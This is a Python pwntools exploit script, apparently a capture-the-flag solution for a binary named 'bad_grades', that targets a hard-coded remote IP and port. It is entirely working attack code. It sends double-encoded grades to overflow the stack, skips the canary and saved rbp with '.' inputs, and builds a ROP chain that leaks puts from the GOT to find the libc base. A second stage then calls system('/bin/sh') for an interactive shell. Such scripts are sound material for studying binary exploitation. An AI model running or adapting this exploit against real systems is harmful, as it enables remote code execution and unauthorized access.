from pwn import * 
import binascii 
import struct 

def hex_to_double(data):

	val = p64(data).hex()
	return (struct.unpack("d", bytes.fromhex(val))[0])

def add_new(size):

	elf = ELF("./bad_grades")
	libc = ELF("./libc.so.6")

	puts_plt = elf.plt['puts']
	puts_got = elf.got['puts']
	pop_rdi = 0x0000000000401263
	add_new_addr = 0x400fd5

	global p
	p.recvuntil("> ")
	p.sendline("2")

	p.recv()
	p.sendline(str(size))
	p.recv()
	for i in range(size - 6):
		p.sendline("0")
		p.recv()

	#skip stack canary
	p.sendline(".")
	p.recv()

	#skip rbp
	p.sendline(".")
	p.recv()

	#overwrite return address
	rdi = hex_to_double(pop_rdi)
	p.sendline(str(rdi))
	p.recv()

	#pop puts_got into rdi
	puts_got = hex_to_double(puts_got)
	p.sendline(str(puts_got))
	p.recv()

	#call puts at plt 
	puts_plt = hex_to_double(puts_plt)
	p.sendline(str(puts_plt))
	p.recv()

	#return to add_new
	add_new_addr = hex_to_double(add_new_addr)
	p.sendline(str(add_new_addr))
	p.recv()
	p.recvline('.')
	leak = p.recvline().rstrip().ljust(8, b'\x00')
	leak = u64(leak)

	log.info(f"PUTS AT GOT: {hex(leak)}")

	libc_base = leak - libc.symbols['puts']
	log.info(f"LIBC BASE : {hex(libc_base)}")
	libc.address = libc_base

	system = libc.symbols['system']
	log.info(f"SYSTEM ADDRESS : {hex(system)}")

	bin_sh = next(libc.search(b'/bin/sh'))
	log.info(f"/BIN/SH at : {hex(bin_sh)} ")

	#================ second stage of the payload ======================

	p.recv()
	p.sendline(str(size))

	p.recv()
	for i in range(size - 6):
		p.sendline("0")
		p.recv()

	#skip the stack canary
	p.sendline(".")
	p.recv()

	#skip rbp 
	p.sendline(".")
	p.recv()

	#overwrite return address 
	p.sendline(str(rdi))
	p.recv()

	#pop /bin/sh to rdi 
	bin_sh = hex_to_double(bin_sh)
	p.sendline(str(bin_sh))
	p.recv()

	#extra retu 
	ret = 0x0000000000400666
	ret = hex_to_double(ret)
	p.sendline(str(ret))
	p.recv()

	#call system 
	system = hex_to_double(system)
	p.sendline(str(system))
	p.interactive()
	
def main():

	global p 

	host = "188.166.173.208"
	port = 31769
	

	p = remote(host, port)

	add_new(39)

	
	p.close()
if __name__ == "__main__":

	main()